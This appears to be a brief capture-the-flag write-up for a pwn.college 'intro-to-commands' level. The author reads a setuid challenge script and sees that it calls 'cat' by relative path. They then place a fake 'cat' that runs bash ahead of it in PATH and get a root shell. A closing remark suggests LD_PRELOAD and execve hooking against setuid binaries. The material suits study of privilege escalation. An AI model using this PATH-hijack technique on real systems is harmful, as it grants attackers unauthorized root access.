```bash
hacker@hello~intro-to-commands:~$ hello
Success! Here is your flag: <flag>
```
Ugh. Boring.
Let's have some fun.

```bash
hacker@hello~intro-to-commands:~$ whereis hello
hello: /challenge/bin/hello

hacker@hello~intro-to-commands:~$ strings /challenge/bin/hello 
#!/opt/pwn.college/bash
fold -s <<< "Success! Here is your flag:"
cat /flag

# huh.

hacker@hello~intro-to-commands:~$ cat /flag
cat: /flag: Permission denied

# That's definitly a setuid bit.
# You thinking what I'm thinking ?

# /flags is a proper path, but cat isn't
# This is almost too easy

hacker@hello~intro-to-commands:~$ mkdir -p /tmp/mybin
echo '#!/bin/bash' > /tmp/mybin/cat
echo 'bash' >> /tmp/mybin/cat
chmod +x /tmp/mybin/cat

hacker@hello~intro-to-commands:~$ PATH="/tmp/mybin:$PATH"  hello
Success! Here is your flag:
root@hello~intro-to-commands:~#

# welp, that was easy.
# tried installing cowsay for the lols, but it has no internet
# ah well
```
Something to ponder: can you hack any setuid'ed bit by LD_PRELOAD'ing ? what if you attack execve ? 
